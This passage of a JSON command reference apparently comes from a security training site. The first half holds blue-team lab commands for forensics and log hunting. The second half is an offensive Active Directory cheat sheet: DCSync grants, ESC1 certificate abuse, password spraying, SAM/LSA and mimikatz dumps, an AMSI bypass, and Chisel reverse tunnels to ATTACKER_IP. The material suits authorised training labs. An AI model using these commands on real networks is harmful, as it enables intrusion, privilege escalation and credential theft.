    "command": "ip.src == 192.168.8.142 && !ssh && !http",
    "tool": "wireshark",
    "lab": "fungames",
    "lab_url": "/blue-team/labs/fungames/",
    "desc": "Filter victim outbound traffic excluding SSH and HTTP to surface covert channels",
    "tags": "wireshark"
  },
  {
    "command": "hashcat -m 16500 hash.txt -a 3 -i '?a?a?a?a'",
    "tool": "shell",
    "lab": "secrets",
    "lab_url": "/blue-team/labs/secrets/",
    "desc": "Brute-force crack a JWT signing secret using hashcat JWT mode (16500) with incremental all-character mask up to 4 characters",
    "tags": "shell"
  },
  {
    "command": "hashcat -m 13751 -a 0 container.vc wordlist",
    "tool": "shell",
    "lab": "veriarty",
    "lab_url": "/blue-team/labs/veriarty/",
    "desc": "Crack a VeraCrypt container password using hashcat SHA-512 AES mode (13751) with a wordlist attack",
    "tags": "shell"
  },
  {
    "command": "gpg --import secret.key gpg --decrypt email.eml.gpg > email.eml",
    "tool": "shell",
    "lab": "veriarty",
    "lab_url": "/blue-team/labs/veriarty/",
    "desc": "Import a PGP private key into GPG keyring and decrypt a GPG-encrypted email to plaintext",
    "tags": "shell"
  },
  {
    "command": "Get-FileHash .\\76561199466436896.png -Algorithm MD5",
    "tool": "powershell",
    "lab": "steam",
    "lab_url": "/blue-team/labs/steam/",
    "desc": "Generate the MD5 hash of a file using PowerShell. Useful for verifying file integrity or matching against known hashes during forensic analysis.",
    "tags": "powershell"
  },
  {
    "command": "cat application-logs.json | grep -i '\"success\"' -A 2",
    "tool": "shell",
    "lab": "crack",
    "lab_url": "/blue-team/labs/crack/",
    "desc": "Search a JSON log file for successful authentication events and display the 2 lines following each match. The -A flag (after) provides surrounding context to reveal associated fields like username and timestamp.",
    "tags": "shell"
  },
  {
    "command": "python ja3.py ~/Desktop/fingerprint.pcap",
    "tool": "python",
    "lab": "fingerprint",
    "lab_url": "/blue-team/labs/fingerprint/",
    "desc": "Run ja3.py against a PCAP to extract TLS ClientHello fingerprints. Outputs destination IP, source IP, port, full JA3 string, and MD5 digest ja3_digest for each TLS connection. The digest can be used for threat hunting across intelligence platforms like VirusTotal and abuse.ch.",
    "tags": "python"
  },
  {
    "command": "source.geo.country_name : \"Germany\" and event.action : \"Sign-in activity\"",
    "tool": "kql",
    "lab": "azurehunt",
    "lab_url": "/blue-team/labs/azurehunt/",
    "desc": "Filter Azure sign-in activity to a specific source country \u2014 used to isolate authentication attempts from anomalous geographic origins",
    "tags": "kql"
  },
  {
    "command": "azure.eventhub.category: \"StorageRead\" and azure.eventhub.operationName: \"GetBlob\"",
    "tool": "kql",
    "lab": "azurehunt",
    "lab_url": "/blue-team/labs/azurehunt/",
    "desc": "Identify blob object reads in Azure Storage diagnostic logs \u2014 surfaces files accessed by an attacker post-compromise",
    "tags": "kql"
  },
  {
    "command": "source.geo.country_name.keyword : \"Germany\" AND event.action : \"Sign-in activity\"",
    "tool": "kql",
    "lab": "azurehunt",
    "lab_url": "/blue-team/labs/azurehunt/",
    "desc": "Keyword-field variant of the Germany sign-in filter \u2014 use when the standard field returns no results due to index mapping differences",
    "tags": "kql"
  },
  {
    "command": "event.action.keyword: \"MICROSOFT.COMPUTE/VIRTUALMACHINES/START/ACTION\"",
    "tool": "kql",
    "lab": "azurehunt",
    "lab_url": "/blue-team/labs/azurehunt/",
    "desc": "Detect VM start actions in Azure activity logs \u2014 identifies attacker-initiated compute resource activation",
    "tags": "kql"
  },
  {
    "command": "event.action: \"MICROSOFT.SQL/SERVERS/DATABASES/EXPORT/ACTION\"",
    "tool": "kql",
    "lab": "azurehunt",
    "lab_url": "/blue-team/labs/azurehunt/",
    "desc": "Hunt for Azure SQL database export events \u2014 a BACPAC export is a direct indicator of bulk data exfiltration",
    "tags": "kql"
  },
  {
    "command": "event.action: \"Add user\"",
    "tool": "kql",
    "lab": "azurehunt",
    "lab_url": "/blue-team/labs/azurehunt/",
    "desc": "Detect new Azure AD account creation events \u2014 used to identify attacker-created backdoor accounts for persistence",
    "tags": "kql"
  },
  {
    "command": "event.action: \"MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE\"",
    "tool": "kql",
    "lab": "azurehunt",
    "lab_url": "/blue-team/labs/azurehunt/",
    "desc": "Hunt for RBAC role assignment writes in Azure activity logs \u2014 high-fidelity indicator of privilege escalation or persistence via role grant",
    "tags": "kql"
  },
  {
    "command": "python vol.py -f memdump.mem windows.cmdline",
    "tool": "volatility",
    "lab": "latent",
    "lab_url": "/blue-team/labs/latent/",
    "desc": "Enumerate all running processes and their full command line arguments from a memory dump. Reveals process names, PIDs, and execution paths \u2014 key for identifying malicious processes and how they were launched.",
    "tags": "volatility"
  },
  {
    "command": "python vol.py -f memdump.mem windows.psscan",
    "tool": "volatility",
    "lab": "latent",
    "lab_url": "/blue-team/labs/latent/",
    "desc": "Scan physical memory for POOL_HEADER structures to find all process objects including hidden and terminated processes. More thorough than pslist as it detects processes attempting to evade detection by unlinking from the process list.",
    "tags": "volatility"
  },
  {
    "command": "python .\\vol.py -f ..\\..\\..\\Investigation\\memdump.mem -r json windows.filescan > filescan.txt",
    "tool": "volatility",
    "lab": "latent",
    "lab_url": "/blue-team/labs/latent/",
    "desc": "Scan memory for all file objects and output as JSON for easier searching. Reveals open file handles including malware on disk \u2014 use the Offset field with psscan to cross-reference virtual addresses of specific files.",
    "tags": "volatility"
  },
  {
    "command": "zip2john builder.zip > builder.hash john builder.hash --wordlist=/usr/share/wordlists/rockyou.txt",
    "tool": "shell",
    "lab": "firstweek",
    "lab_url": "/blue-team/labs/firstweek/",
    "desc": "Extract a hash from a password-protected zip archive and crack it with a wordlist. zip2john converts the zip encryption into a John-compatible hash format; john then brute-forces it against rockyou.txt to recover the plaintext password.",
    "tags": "shell"
  },
  {
    "command": "grep -v \"^#\" iis-log-dump.log | awk '{print $9}' | sort | uniq -c | sort -rn",
    "tool": "grep",
    "lab": "hunt3r",
    "lab_url": "/blue-team/labs/hunt3r/",
    "desc": "Strip IIS comment lines then extract the client IP field, rank all source IPs by request count in descending order. Anomalous volumes from a single IP surface immediately against the baseline of normal traffic distribution.",
    "tags": "grep"
  },
  {
    "command": "grep \"200.10.209.169\" iis-log-dump.log | awk '{print $1, $2}' | sort | sed -n '1p;$p'",
    "tool": "grep",
    "lab": "hunt3r",
    "lab_url": "/blue-team/labs/hunt3r/",
    "desc": "Extract timestamps for all requests from a target IP, sort chronologically, and print only the first and last entries. Gives the exact start and end of the attack window for duration calculation.",
    "tags": "grep"
  },
  {
    "command": "grep -v \"^#\" iis-log-dump.log | awk '{print $9}' | sort -u | wc -l",
    "tool": "grep",
    "lab": "hunt3r",
    "lab_url": "/blue-team/labs/hunt3r/",
    "desc": "Strip comment lines, extract the client IP field, deduplicate, and count. Returns the total number of distinct source IPs in the log file including the malicious one.",
    "tags": "grep"
  },
  {
    "command": "Import-Module PersistenceSniper Find-AllPersistence | Format-List",
    "tool": "powershell",
    "lab": "marksman",
    "lab_url": "/blue-team/labs/marksman/",
    "desc": "Load the PersistenceSniper module and enumerate all persistence mechanisms on the local system. Checks registry Run keys, scheduled tasks, startup folders, IFEO debugger entries, and other common persistence locations, outputting each finding with technique name, ATT&CK classification, path, value, and access level gained.",
    "tags": "powershell"
  },
  {
    "command": "zgrep -i \"cat.nanobotninjas\" dns* | grep \"TXT\" | awk '{print $3}' | sort -u",
    "tool": "shell",
    "lab": "nano",
    "lab_url": "/blue-team/labs/nano/",
    "desc": "Search compressed Zeek DNS logs for queries to a suspicious domain, filter for TXT record type only, extract the source IP field, and deduplicate. Identifies which internal host is responsible for DNS tunnelling TXT record queries.",
    "tags": "shell"
  },
  {
    "command": "zgrep -i \"cat.nanobotninjas\" dns* | head -20",
    "tool": "shell",
    "lab": "nano",
    "lab_url": "/blue-team/labs/nano/",
    "desc": "Search compressed Zeek DNS logs for queries to a suspicious domain and print the first 20 results. Reveals the raw query structure including hex-prefixed subdomains used for cache-busting in DNS tunnelling activity.",
    "tags": "shell"
  },
  {
    "command": "C:\\xampp\\mysql\\bin\\mysql.exe -u root -p",
    "tool": "sql",
    "lab": "brute",
    "lab_url": "/blue-team/labs/brute/",
    "desc": "Connect to the local MariaDB instance as root via the XAMPP bundled MySQL client. Prompts for password on entry. Use when investigating XAMPP-based web applications",
    "tags": "sql"
  },
  {
    "command": "SHOW DATABASES; USE supercoolapp; SHOW TABLES;",
    "tool": "sql",
    "lab": "brute",
    "lab_url": "/blue-team/labs/brute/",
    "desc": "List all databases on the server, switch into the target application database, then list all tables. Standard first-step enumeration when investigating an unknown database schema during IR.",
    "tags": "sql"
  },
  {
    "command": "SELECT * FROM zz_app_admins;",
    "tool": "sql",
    "lab": "brute",
    "lab_url": "/blue-team/labs/brute/",
    "desc": "Retrieve all rows from the application admin table. Used to enumerate user accounts, email addresses, password hashes, and account status fields during database forensics.",
    "tags": "sql"
  },
  {
    "command": ".\\bmc-tools.py -s ..\\..\\Cache0000.bin -d .",
    "tool": "powershell",
    "lab": "rdp",
    "lab_url": "/blue-team/labs/rdp/",
    "desc": "Extract RDP bitmap cache tiles from Cache0000.bin into the current directory as individual PNG files. Each tile is a 64x64px fragment of the remote desktop session. Feed the output folder into RdpCacheStitcher for visual reconstruction.",
    "tags": "powershell"
  },
  {
    "command": "exiftool totamtoWithShell.jpg",
    "tool": "shell",
    "lab": "photograph",
    "lab_url": "/blue-team/labs/photograph/",
    "desc": "Dump all EXIF and XMP metadata from a JPEG. For malicious samples, check XP Comment, Description, and custom fields \u2014 attackers embed payload URLs, PHP stagers, and C2 addresses directly in metadata fields that most security controls never inspect.",
    "tags": "shell"
  },
  {
    "command": "python3 jpegdump.py -E md5 malware.jpg",
    "tool": "python",
    "lab": "photograph",
    "lab_url": "/blue-team/labs/photograph/",
    "desc": "Parse a JPEG's segment structure and display MD5 hashes for each segment. Used to detect polyglot files \u2014 multiple SOI/EOI markers indicate concatenated JPEGs, and non-zero delta (d=) values between segments reveal hidden data inserted between image boundaries.",
    "tags": "python"
  },
  {
    "command": "python3 jpegdump.py malware.jpg -s 29d -d > malware.crt",
    "tool": "python",
    "lab": "photograph",
    "lab_url": "/blue-team/labs/photograph/",
    "desc": "Extract the raw bytes between two JPEG segments using the delta selector (-s 29d). Used to recover data hidden in the gap between concatenated JPEG boundaries \u2014 in this lab extracts a fake PEM certificate block concealing a base64-encoded PE.",
    "tags": "python"
  },
  {
    "command": "volatility_standalone.exe -f ..\\..\\memdump.mem --profile=Win7SP1x86 hivelist",
    "tool": "volatility",
    "lab": "insider-threat",
    "lab_url": "/blue-team/labs/insider-threat/",
    "desc": "List all registry hives loaded in memory with their virtual and physical offsets. Use to locate SYSTEM, SAM, SOFTWARE, and user NTUSER.DAT hives before dumping \u2014 offsets from this output are required for dumpregistry.",
    "tags": "volatility"
  },
  {
    "command": "volatility_standalone.exe -f ..\\..\\memdump.mem --profile=Win7SP1x86 dumpregistry -o 0x8d818270 --dump-dir .",
    "tool": "volatility",
    "lab": "insider-threat",
    "lab_url": "/blue-team/labs/insider-threat/",
    "desc": "Dump a specific registry hive from memory to disk using its virtual offset from hivelist. Load the output .reg file in MiTec Windows Registry Recovery for offline analysis \u2014 used here to extract the SYSTEM hive for USB device enumeration via USBSTOR.",
    "tags": "volatility"
  },
  {
    "command": "vol -f 192-Reveal.dmp windows.pstree",
    "tool": "volatility",
    "lab": "reveal",
    "lab_url": "/blue-team/labs/reveal/",
    "desc": "Render full process tree to identify anomalous parent-child relationships \u2014 wordpad.exe spawning powershell.exe flagged as malicious.",
    "tags": "volatility"
  },
  {
    "command": "vol -f 192-Reveal.dmp windows.getsids | grep \"4120\"",
    "tool": "volatility",
    "lab": "reveal",
    "lab_url": "/blue-team/labs/reveal/",
    "desc": "Resolve SIDs for a specific PID to identify the user account context under which the malicious process was running",
    "tags": "volatility"
  },
  {
    "command": "Get-AuthenticodeSignature -FilePath \"neuro.msi\" | Select-Object Status",
    "tool": "powershell",
    "lab": "mitsu",
    "lab_url": "/blue-team/labs/mitsu/",
    "desc": "Checks the digital signature status of neuro.msi \u2014 surfaces unsigned or invalidly signed installers that may indicate tampered or malicious packages.",
    "tags": "powershell"
  },
  {
    "command": "Get-LocalUser | Select-Object Name | Out-File C:\\before.txt Get-LocalUser | Select-Object Name | Out-File C:\\after.txt Compare-Object (Get-Content ..\\before.txt) (Get-Content ..\\after.txt)",
    "tool": "powershell",
    "lab": "mitsu",
    "lab_url": "/blue-team/labs/mitsu/",
    "desc": "Captures local user accounts before and after executing a suspicious binary, then diffs the two snapshots to reveal any accounts silently created during execution.",
    "tags": "powershell"
  },
  {
    "command": "Get-LocalGroupMember -Group \"Administrators\"",
    "tool": "powershell",
    "lab": "mitsu",
    "lab_url": "/blue-team/labs/mitsu/",
    "desc": "Lists all members of the local Administrators group \u2014 used to confirm whether a newly created account was granted elevated privileges.",
    "tags": "powershell"
  },
  {
    "command": "powershell.exe -NoProfile -WindowsStyle Hidden -Command \"Get-Process | Out-File c:\\processes.txt\"",
    "tool": "powershell",
    "lab": "mitsu",
    "lab_url": "/blue-team/labs/mitsu/",
    "desc": "Attacker-deployed scheduled task command: dumps running processes to disk silently at logon using -WindowStyle Hidden to avoid user visibility.",
    "tags": "powershell"
  },
  {
    "command": "powershell -Command \"Add-MpPreference -Force -ExclusionPath 'C:\\ProgramData\\Microsoft\\env\\env.exe'\" powershell -Command \"Add-MpPreference -Force -ExclusionPath 'C:\\ProgramData\\Microsoft\\env\\bcd.bat'\" powershell -Command \"Add-MpPreference -Force -ExclusionPath 'C:\\ProgramData\\Microsoft\\env\\update.bat'\"",
    "tool": "powershell",
    "lab": "meteorhit-indra",
    "lab_url": "/blue-team/labs/meteorhit-indra/",
    "desc": "Adds Windows Defender exclusion paths for malicious executables and scripts to prevent AV scanning prior to wiper detonation",
    "tags": "powershell"
  },
  {
    "command": "pip3 install bloodhound bloodhound-python -d domain.com -u user -p pass -c All -ns DC_IP bloodhound-python -d domain.com -u user --hashes :NTLM_HASH -c All -ns DC_IP bloodhound-python -d domain.com -u user -p pass -c DCOnly -ns DC_IP     # DC only bloodhound-python -d domain.com -u user -p pass -c Session -ns DC_IP    # sessions only bloodhound-python -d domain.com -u user -p pass -c All -ns DC_IP -o /tmp/bh/ bloodhound-python -d domain.com -u user -p pass -c All --dns-tcp -ns DC_IP",
    "tool": "shell",
    "lab": "bloodhound",
    "lab_url": "",
    "source": "wiki",
    "desc": "From Kali (bloodhound-python)",
    "tags": "wiki shell bloodhound"
  },
  {
    "command": ".\\SharpHound.exe -c All .\\SharpHound.exe -c All --stealth .\\SharpHound.exe -c All -d domain.com .\\SharpHound.exe -c All --outputdirectory C:\\temp\\ powershell -ep bypass -c \". .\\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All\"",
    "tool": "powershell",
    "lab": "bloodhound",
    "lab_url": "",
    "source": "wiki",
    "desc": "From Windows (SharpHound)",
    "tags": "wiki powershell bloodhound"
  },
  {
    "command": "sudo neo4j start bloodhound",
    "tool": "shell",
    "lab": "bloodhound",
    "lab_url": "",
    "source": "wiki",
    "desc": "Starting BloodHound",
    "tags": "wiki shell bloodhound"
  },
  {
    "command": "$sid = Convert-NameToSid wley Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) { get-acl \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'} }",
    "tool": "powershell",
    "lab": "bloodhound",
    "lab_url": "",
    "source": "wiki",
    "desc": "When BloodHound shows an ACL edge but you need to confirm or enumerate manually:",
    "tags": "wiki powershell bloodhound"
  },
  {
    "command": "pip install bloodyAD git clone https://github.com/CravateRouge/bloodyAD pip install .",
    "tool": "python",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "Installation",
    "tags": "wiki python bloodyad"
  },
  {
    "command": "bloodyAD -u USER -p PASS -d domain.com --host DC_IP <action>",
    "tool": "shell",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "Core Syntax",
    "tags": "wiki shell bloodyad"
  },
  {
    "command": "bloodyAD -u olivia -p ichliebedich -d administrator.htb --host 10.10.11.42 \\ set password michael 'NewPassword123!' bloodyAD -u michael -p 'NewPassword123!' -d administrator.htb --host 10.10.11.42 \\ set password benjamin 'NewPassword123!'",
    "tool": "shell",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "If you have ForceChangePassword or GenericAll over a user account:",
    "tags": "wiki shell bloodyad"
  },
  {
    "command": "bloodyAD -u user -p pass -d domain.com --host DC_IP \\ add groupMember \"Domain Admins\" user bloodyAD -u user -p pass -d domain.com --host DC_IP \\ add groupMember \"Remote Management Users\" targetuser",
    "tool": "shell",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "Add User to Group (GenericAll / GenericWrite on Group)",
    "tags": "wiki shell bloodyad"
  },
  {
    "command": "bloodyAD -u user -p pass -d domain.com --host DC_IP \\ set object targetuser servicePrincipalName -v \"fake/spn\" bloodyAD -u user -p pass -d domain.com --host DC_IP \\ remove object targetuser servicePrincipalName -v \"fake/spn\"",
    "tool": "shell",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "Set SPN (GenericWrite \u2014 enables Targeted Kerberoasting)",
    "tags": "wiki shell bloodyad"
  },
  {
    "command": "bloodyAD -u user -p pass -d domain.com --host DC_IP \\ set object targetuser description -v \"new description\" bloodyAD -u user -p pass -d domain.com --host DC_IP \\ set object targetuser userAccountControl -v 512",
    "tool": "shell",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "Write to Object Attributes (WriteProperty / GenericWrite)",
    "tags": "wiki shell bloodyad"
  },
  {
    "command": "bloodyAD -u user -p pass -d domain.com --host DC_IP \\ add dcsync attackeruser",
    "tool": "shell",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "Grant DCSync Rights (WriteDACL)",
    "tags": "wiki shell bloodyad"
  },
  {
    "command": "bloodyAD -u user -p pass -d domain.com --host DC_IP get object targetuser bloodyAD -u user -p pass -d domain.com --host DC_IP get groupMember \"Domain Admins\" bloodyAD -u user -p pass -d domain.com --host DC_IP get search --filter \"(objectClass=user)\"",
    "tool": "shell",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "Enumeration",
    "tags": "wiki shell bloodyad"
  },
  {
    "command": "bloodyAD -u admin --hashes :NTLM_HASH -d domain.com --host DC_IP set password target 'Pass123!' KRB5CCNAME=ticket.ccache bloodyAD -k -d domain.com --host DC_IP set password target 'Pass123!'",
    "tool": "shell",
    "lab": "bloodyad",
    "lab_url": "",
    "source": "wiki",
    "desc": "Pass the Hash / Kerberos",
    "tags": "wiki shell bloodyad"
  },
  {
    "command": "pip3 install certipy-ad pipx install certipy-ad",
    "tool": "shell",
    "lab": "certipy",
    "lab_url": "",
    "source": "wiki",
    "desc": "Installation",
    "tags": "wiki shell certipy"
  },
  {
    "command": "certipy find -u user@domain.htb -p 'Password123!' -dc-ip DC_IP -vulnerable certipy find -u user@domain.htb -p 'Password123!' -dc-ip DC_IP -stdout certipy find -u user@domain.htb -hashes :NTLM_HASH -dc-ip DC_IP -vulnerable",
    "tool": "shell",
    "lab": "certipy",
    "lab_url": "",
    "source": "wiki",
    "desc": "Enumeration",
    "tags": "wiki shell certipy"
  },
  {
    "command": "certipy req -u user@domain.htb -p 'Password123!' \\ -ca CA_NAME -template TEMPLATE_NAME \\ -upn administrator@domain.htb \\ -dc-ip DC_IP certipy auth -pfx administrator.pfx -dc-ip DC_IP evil-winrm -i DC_IP -u administrator -H NTLM_HASH impacket-secretsdump -hashes :NTLM_HASH administrator@DC_IP",
    "tool": "shell",
    "lab": "certipy",
    "lab_url": "",
    "source": "wiki",
    "desc": "ESC1 is the most common misconfiguration: the template has ENROLLEE_SUPPLIES_SUBJECT set, low-privilege users can enroll, and the template allows Client Authentication. This allows requesting a certificate for any user (including Domain Admin).",
    "tags": "wiki shell certipy"
  },
  {
    "command": "certipy find -u trainee@retro.htb -p 'Training123!' \\ -dc-ip 10.10.11.X -vulnerable certipy req -u trainee@retro.htb -p 'Training123!' \\ -ca retro-DC-CA -template RetroClient \\ -upn administrator@retro.htb \\ -dc-ip 10.10.11.X certipy auth -pfx administrator.pfx -dc-ip 10.10.11.X impacket-wmiexec -hashes :32693B11E6AA90EB43D32C72A07CEEA6 \\ administrator@10.10.11.X",
    "tool": "shell",
    "lab": "certipy",
    "lab_url": "",
    "source": "wiki",
    "desc": "ESC1 \u2014 Practical (HTB Retro)",
    "tags": "wiki shell certipy"
  },
  {
    "command": "openssl pkcs12 -in administrator.pfx -out administrator.pem -nodes openssl pkcs12 -in administrator.pfx -nocerts -out private.key -nodes",
    "tool": "shell",
    "lab": "certipy",
    "lab_url": "",
    "source": "wiki",
    "desc": "Certificate Conversion",
    "tags": "wiki shell certipy"
  },
  {
    "command": "chainsaw hunt logs/ --sigma sigma-rules/ --mapping mappings/sigma-event-logs-all.yml chainsaw search -t \"4625\" logs/ chainsaw search -s \"mimikatz\" logs/ chainsaw search -s \"powershell\" logs/System.evtx chainsaw hunt logs/ --sigma rules/ --mapping mappings/ --output results.csv --csv chainsaw hunt logs/ --sigma rules/ --mapping mappings/ --output results.json --json chainsaw dump logs/Security.evtx chainsaw search --event-id 4625 logs/",
    "tool": "powershell",
    "lab": "chainsaw",
    "lab_url": "",
    "source": "wiki",
    "desc": "Core Commands",
    "tags": "wiki powershell chainsaw"
  },
  {
    "command": "chisel server --reverse -p 8080 chisel server --reverse -p 8080 -v",
    "tool": "shell",
    "lab": "chisel",
    "lab_url": "",
    "source": "wiki",
    "desc": "Setup",
    "tags": "wiki shell chisel"
  },
  {
    "command": "chisel server --reverse -p 8080 ./chisel client ATTACKER_IP:8080 R:socks .\\chisel.exe client ATTACKER_IP:8080 R:socks",
    "tool": "shell",
    "lab": "chisel",
    "lab_url": "",
    "source": "wiki",
    "desc": "SOCKS Proxy (Most Useful \u2014 Full Network Access)",
    "tags": "wiki shell chisel"
  },
  {
    "command": "proxychains nmap -sT -Pn INTERNAL_TARGET proxychains crackmapexec smb INTERNAL_SUBNET/24 -u user -p pass",
    "tool": "nmap",
    "lab": "chisel",
    "lab_url": "",
    "source": "wiki",
    "desc": "/etc/proxychains4.conf:",
    "tags": "wiki nmap chisel"
  },
  {
    "command": "chisel server --reverse -p 8080 ./chisel client ATTACKER:8080 R:8888:INTERNAL_TARGET:80 curl http://127.0.0.1:8888",
    "tool": "shell",
    "lab": "chisel",
    "lab_url": "",
    "source": "wiki",
    "desc": "Single Port Forward",
    "tags": "wiki shell chisel"
  },
  {
    "command": "./chisel client ATTACKER:8080 R:socks R:8888:INTERNAL_HOST:80 R:4444:INTERNAL_HOST:22",
    "tool": "shell",
    "lab": "chisel",
    "lab_url": "",
    "source": "wiki",
    "desc": "Multiple Tunnels in One Connection",
    "tags": "wiki shell chisel"
  },
  {
    "command": "chisel server -p 8080 ./chisel client ATTACKER:8080 3306:127.0.0.1:3306",
    "tool": "shell",
    "lab": "chisel",
    "lab_url": "",
    "source": "wiki",
    "desc": "Local Port Forward (Less Common)",
    "tags": "wiki shell chisel"
  },
  {
    "command": "./chisel client KALI:8080 R:socks ./chisel server --reverse -p 9090 proxychains ./chisel client PIVOT1:9090 R:socks",
    "tool": "shell",
    "lab": "chisel",
    "lab_url": "",
    "source": "wiki",
    "desc": "Multi-Hop Pivoting",
    "tags": "wiki shell chisel"
  },
  {
    "command": "./chisel server -v -p 1234 --socks5 ./chisel client -v PIVOT_HOST:1234 socks",
    "tool": "shell",
    "lab": "chisel",
    "lab_url": "",
    "source": "wiki",
    "desc": "When you can reach the pivot host but it can't reach you back:",
    "tags": "wiki shell chisel"
  },
  {
    "command": "crackmapexec smb TARGET crackmapexec smb TARGET -u user -p pass crackmapexec smb TARGET -u '' -p '' crackmapexec smb TARGET -u admin -H NTLM_HASH",
    "tool": "shell",
    "lab": "crackmapexec",
    "lab_url": "",
    "source": "wiki",
    "desc": "SMB \u2014 Core Commands",
    "tags": "wiki shell crackmapexec"
  },
  {
    "command": "crackmapexec smb TARGET -u user -p pass --shares crackmapexec smb TARGET -u user -p pass -M spider_plus crackmapexec smb TARGET -u user -p pass --users crackmapexec smb TARGET -u user -p pass --groups crackmapexec smb TARGET -u user -p pass --loggedon-users crackmapexec smb TARGET -u user -p pass --local-admins crackmapexec smb TARGET -u admin -p pass --sam crackmapexec smb TARGET -u admin -p pass --lsa",
    "tool": "shell",
    "lab": "crackmapexec",
    "lab_url": "",
    "source": "wiki",
    "desc": "SMB \u2014 Enumeration",
    "tags": "wiki shell crackmapexec"
  },
  {
    "command": "crackmapexec smb DC_IP -u users.txt -p 'Password123!' --continue-on-success crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123!' crackmapexec smb DC_IP -u users.txt -p passwords.txt --no-bruteforce",
    "tool": "shell",
    "lab": "crackmapexec",
    "lab_url": "",
    "source": "wiki",
    "desc": "Password Spraying",
    "tags": "wiki shell crackmapexec"
  },
  {
    "command": "crackmapexec smb TARGET -u admin -p pass -x \"whoami\" crackmapexec smb TARGET -u admin -p pass -X \"Get-Process\" crackmapexec smb TARGET -u admin -p pass --exec-method smbexec -x \"whoami\"",
    "tool": "shell",
    "lab": "crackmapexec",
    "lab_url": "",
    "source": "wiki",
    "desc": "Command Execution",
    "tags": "wiki shell crackmapexec"
  },
  {
    "command": "crackmapexec winrm TARGET -u user -p pass crackmapexec winrm TARGET -u user -p pass -x \"whoami\"",
    "tool": "shell",
    "lab": "crackmapexec",
    "lab_url": "",
    "source": "wiki",
    "desc": "WinRM",
    "tags": "wiki shell crackmapexec"
  },
  {
    "command": "crackmapexec ldap DC_IP -u user -p pass --users crackmapexec ldap DC_IP -u user -p pass --groups crackmapexec ldap DC_IP -u user -p pass --asreproast asrep.txt crackmapexec ldap DC_IP -u user -p pass --kerberoasting kerberoast.txt crackmapexec ldap DC_IP -u user -p pass --pass-pol",
    "tool": "shell",
    "lab": "crackmapexec",
    "lab_url": "",
    "source": "wiki",
    "desc": "LDAP (Active Directory)",
    "tags": "wiki shell crackmapexec"
  },
  {
    "command": "crackmapexec smb -L crackmapexec smb DC_IP -u user -p pass -M bloodhound crackmapexec smb TARGET -u admin -p pass -M lsassy crackmapexec smb TARGET -u admin -p pass -M mimikatz",
    "tool": "shell",
    "lab": "crackmapexec",
    "lab_url": "",
    "source": "wiki",
    "desc": "Modules",
    "tags": "wiki shell crackmapexec"
  },
  {
    "command": "evil-winrm -i TARGET -u user -p pass evil-winrm -i TARGET -u administrator -H NTLM_HASH evil-winrm -i TARGET -u domain\\\\user -p pass evil-winrm -i TARGET -u user -p pass -S evil-winrm -i TARGET -u user -p pass -P 5986",
    "tool": "shell",
    "lab": "evil-winrm",
    "lab_url": "",
    "source": "wiki",
    "desc": "Connection",
    "tags": "wiki shell evil-winrm"
  },
  {
    "command": "upload /local/path/file.exe C:\\temp\\file.exe download C:\\Users\\user\\Desktop\\proof.txt /local/path/ upload /local/winpeas.exe",
    "tool": "shell",
    "lab": "evil-winrm",
    "lab_url": "",
    "source": "wiki",
    "desc": "File Transfer",
    "tags": "wiki shell evil-winrm"
  },
  {
    "command": "evil-winrm -i TARGET -u user -p pass -s /opt/PowerSploit/Privesc/ PS > PowerUp.ps1 PS > Invoke-AllChecks",
    "tool": "powershell",
    "lab": "evil-winrm",
    "lab_url": "",
    "source": "wiki",
    "desc": "Script Loading",
    "tags": "wiki powershell evil-winrm"
  },
  {
    "command": "whoami whoami /all whoami /priv systeminfo ipconfig /all netstat -ano Get-Process Get-Service Get-ChildItem -Path C:\\ -Filter \"*.txt\" -Recurse -ErrorAction SilentlyContinue Get-ChildItem -Path C:\\Users -Recurse -ErrorAction SilentlyContinue Get-Content C:\\Users\\Administrator\\Desktop\\proof.txt Bypass-4MSI Invoke-Binary /local/binary.exe",
    "tool": "powershell",
    "lab": "evil-winrm",
    "lab_url": "",
    "source": "wiki",
    "desc": "Useful In-Session Commands",
    "tags": "wiki powershell evil-winrm"
  },
  {
    "command": "ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt ffuf -u http://TARGET/FUZZ -w wordlist.txt -mc 200,301,302 ffuf -u http://TARGET/FUZZ -w wordlist.txt -o results.json -of json",
    "tool": "shell",
    "lab": "ffuf",
    "lab_url": "",
    "source": "wiki",
    "desc": "Basic Usage",
    "tags": "wiki shell ffuf"
  },
  {
    "command": "ffuf -u http://TARGET/FUZZ -w wordlist.txt -fc 404 ffuf -u http://TARGET/FUZZ -w wordlist.txt -fs 1234 ffuf -u http://TARGET/FUZZ -w wordlist.txt -fw 10 ffuf -u http://TARGET/FUZZ -w wordlist.txt -fl 5 ffuf -u http://TARGET/FUZZ -w wordlist.txt -mr \"Welcome\"",
    "tool": "shell",
    "lab": "ffuf",
    "lab_url": "",
    "source": "wiki",
    "desc": "Filtering Noise",
    "tags": "wiki shell ffuf"
  },
  {
    "command": "ffuf -u http://TARGET/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt ffuf -u http://TARGET/FUZZ.php -w wordlist.txt ffuf -u http://TARGET/W1/W2 -w dirs.txt:W1 -w files.txt:W2",
    "tool": "shell",
    "lab": "ffuf",
    "lab_url": "",
    "source": "wiki",
    "desc": "File Extension Fuzzing",
    "tags": "wiki shell ffuf"
  },
  {
